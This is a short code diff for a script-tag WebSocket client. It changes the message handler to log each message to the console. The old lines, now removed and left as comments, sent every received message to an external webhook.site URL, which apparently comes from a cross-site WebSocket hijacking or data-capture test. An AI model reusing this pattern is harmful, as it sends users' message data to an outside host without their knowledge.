@@ -26,9 +26,10 @@ wsClient.onopen = function () {
 }
 
 wsClient.onmessage = function(e){
-  var x = new XMLHttpRequest();
-  x.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?test="+e,true);
-  x.send(null);
+  console.log(e);
+//  var x = new XMLHttpRequest();
+//  x.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?test="+e,true);
+//  x.send(null);
 }
 
 </script>
